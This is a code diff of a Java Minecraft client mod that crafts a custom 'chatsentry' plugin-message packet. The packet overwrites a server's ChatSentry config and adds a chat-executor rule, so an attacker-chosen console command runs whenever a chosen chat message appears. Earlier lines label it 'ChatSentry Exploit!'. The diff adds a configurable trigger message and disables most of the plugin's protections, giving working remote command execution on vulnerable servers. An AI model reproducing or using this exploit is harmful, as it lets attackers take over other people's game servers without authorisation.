@@ -11,18 +11,19 @@ import net.minecraft.util.Identifier;
 import java.io.ByteArrayOutputStream;
 import java.util.Objects;
 
-public record ChatSentryPayloadPacket(String command, boolean isBungee, String type) implements CustomPayload {
+public record ChatSentryPayloadPacket(String command, boolean isBungee, String type, String executionMessage) implements CustomPayload {
     public static final PacketCodec<PacketByteBuf, ChatSentryPayloadPacket> CODEC = CustomPayload.codecOf(ChatSentryPayloadPacket::write, ChatSentryPayloadPacket::new);
     public static final Id<ChatSentryPayloadPacket> ID = new Id<>(Identifier.of("chatsentry", "datasync"));
 
     private ChatSentryPayloadPacket(PacketByteBuf buf) {
-        this(buf.readString(), buf.readBoolean(), buf.readString());
+        this(buf.readString(), buf.readBoolean(), buf.readString(), buf.readString());
     }
 
-    public ChatSentryPayloadPacket(String command, boolean isBungee, String type) {
+    public ChatSentryPayloadPacket(String command, boolean isBungee, String type, String executionMessage) {
         this.command = command;
         this.isBungee = isBungee;
         this.type = type;
+        this.executionMessage = executionMessage;
     }
 
     private void write(PacketByteBuf buf) {
@@ -39,58 +40,35 @@ public record ChatSentryPayloadPacket(String command, boolean isBungee, String t
                 out.writeUTF("config.yml");
                 out.writeUTF("""
                          check-for-updates: false
-                         
                          process-chat: true
                          process-commands: true
-                         
                          process-signs: true
                          process-anvils: true
                          process-books: true
-                         
                          context-prediction: true
-                         
                          disable-vanilla-spam-kick: true
-                         
                          network:
                          enable: false
                          sync-configs: true
                          global-admin-notifier-messages: true
-                         
                          enable-admin-notifier: false
-                         
                          enable-discord-notifier: false
-                         
                          enable-auto-punisher: false
-                         
                          enable-word-and-phrase-filter: false
-                         
                          enable-link-and-ad-blocker: false
-                         
                          enable-spam-blocker: false
-                         
                          enable-chat-cooldown: false
-                         
                          enable-anti-chat-flood: false
-                         
                          enable-unicode-remover: false
-                         
                          enable-cap-limiter: false
-                         
                          enable-anti-parrot: false
-                         
                          enable-chat-executor: true
                          enable-anti-statue-spambot: false
-                         
                          enable-anti-relog-spam: false
-                         
                          enable-anti-join-flood: false
-                         
                          enable-anti-command-prefix: false
-                         
                          enable-auto-grammar: false
-                         
                          enable-command-spy: false
-                         
                          enable-logging-for:
                          chat-cooldown: false
                          link-and-ad-blocker: true
@@ -102,9 +80,7 @@ public record ChatSentryPayloadPacket(String command, boolean isBungee, String t
                          anti-chat-flood: true
                          anti-statue-spambot: false
                          chat-executor: false
-                         
                          clean-logs-older-than: 30
-                         
                          override-bypass-permissions:
                          chat-cooldown: false
                          link-and-ad-blocker: false
@@ -120,24 +96,14 @@ public record ChatSentryPayloadPacket(String command, boolean isBungee, String t
                          auto-grammar: false
                          anti-command-prefix: false
                          command-spy: false
-                         
                          lockdown:
                          active: false
                          current-mode: "only-known"
                          exempt-usernames:
                            - "Notch"
                            - "jeb_"
-                         
                          command-blacklist:
                          - "/tell"
-                         - "/t"
-                         - "/msg"
-                         - "/w"
-                         - "/r"
-                         - "/whisper"
-                         - "/w"
-                         - "/pm"
-                         - "/me"
                          """);
             } else {
                 out.writeUTF("sync");
@@ -147,12 +113,13 @@ public record ChatSentryPayloadPacket(String command, boolean isBungee, String t
                 out.writeUTF("""
                          entries:
                            1:
-                             match: "{regex}(paradiseprivate)"
+                             match: "{regex}(REPLACE-THE-MESSAGE)"
                              set-matches-as: "{block}"
                              execute:
-                               - "{console_cmd}: REPLACETHECOMMAND"
-                               - "{player_msg}: &a&lChatSentry Exploit!"
-                         """.replaceAll("REPLACETHECOMMAND", command));
+                               - "{console_cmd}: REPLACE-THE-COMMAND"
+                               - "{player_msg}: &a&lSUCCESS!"
+                         """.replaceAll("REPLACE-THE-COMMAND", command)
+                        .replaceAll("REPLACE-THE-MESSAGE", executionMessage));
             }
             out.writeUTF("2822111278697");
             buf.writeBytes(out.toByteArray());
